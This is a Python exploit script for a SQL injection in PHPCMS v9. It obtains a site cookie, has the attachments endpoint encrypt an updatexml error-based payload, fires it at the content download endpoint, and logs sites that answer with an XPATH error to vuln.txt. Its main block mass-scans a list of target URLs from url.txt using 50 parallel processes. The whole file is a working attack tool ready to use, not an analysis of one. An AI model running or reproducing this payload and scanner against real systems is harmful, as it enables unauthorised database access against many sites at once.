#!/usr/bin/python
# -*- coding:utf-8 -*-
import requests
import re
from urllib.parse import quote
import urllib3
urllib3.disable_warnings()
from multiprocessing import Pool

#phpcmsv9 sql注入


def poc(url):
    url = url if '://' in url else 'http://' + url
    url = url.split('#')[0].split('?')[0].rstrip('/').rstrip('/index.php')
    payload = "&id=%*27 and updat*exml(1,con*cat(1,(us*er())),1)%23&modelid=1&catid=1&m=1&f="

    cookies = {}
    step1 = '{}/index.php?m=wap&a=index&siteid=1'.format(url)
    try:
        for c in requests.get(step1, timeout=3,verify=False).cookies:
            if c.name[-7:] == '_siteid':
                cookie_head = c.name[:6]
                cookies[cookie_head + '_userid'] = c.value
                cookies[c.name] = c.value
                break
        else:
            return False

        step2 = "{}/index.php?m=attachment&c=attachments&a=swfupload_json&src={}".format(url, quote(payload))
        for c in requests.get(step2, cookies=cookies, timeout=3,verify=False).cookies:
            if c.name[-9:] == '_att_json':
                enc_payload = c.value
                break
        else:
            return False

        setp3 = url + '/index.php?m=content&c=down&a_k=' + enc_payload
        r = requests.get(setp3, cookies=cookies, timeout=3,verify=False)
        if "XPATH syntax error:" in r.text:
            with open("vuln.txt",'a+') as f:
                f.write(f"{url}|存在PHPCMSV9注入漏洞")
                f.close()
    except EOFError as e:
        print(e)


if __name__ == '__main__':
	p = Pool(50)
	URLS=[]
	for i in open("url.txt",encoding='utf-8'):
		URLS.append(i.strip('\n'))
	for k in URLS:
		p.apply_async(poc,args=(k,))
	p.close()
	p.join()